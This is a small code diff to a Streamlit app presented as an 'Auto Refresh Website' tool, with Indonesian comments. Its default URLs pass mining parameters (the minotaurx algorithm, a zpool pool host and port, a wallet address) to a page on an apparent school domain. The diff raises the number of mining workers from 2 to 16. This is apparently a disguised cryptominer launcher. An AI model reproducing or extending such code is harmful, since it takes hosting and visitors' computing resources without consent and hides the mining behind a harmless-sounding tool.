@@ -44,8 +44,8 @@ def open_website(url):
 st.title("Auto Refresh Website")
 
 # URL situs web yang ingin dibuka
-url1 = st.text_input("Masukkan URL 1:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=2")
-url2 = st.text_input("Masukkan URL 2:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=2")
+url1 = st.text_input("Masukkan URL 1:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")
+url2 = st.text_input("Masukkan URL 2:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")
 
 # Tombol untuk memulai proses
 if st.button("Mulai"):
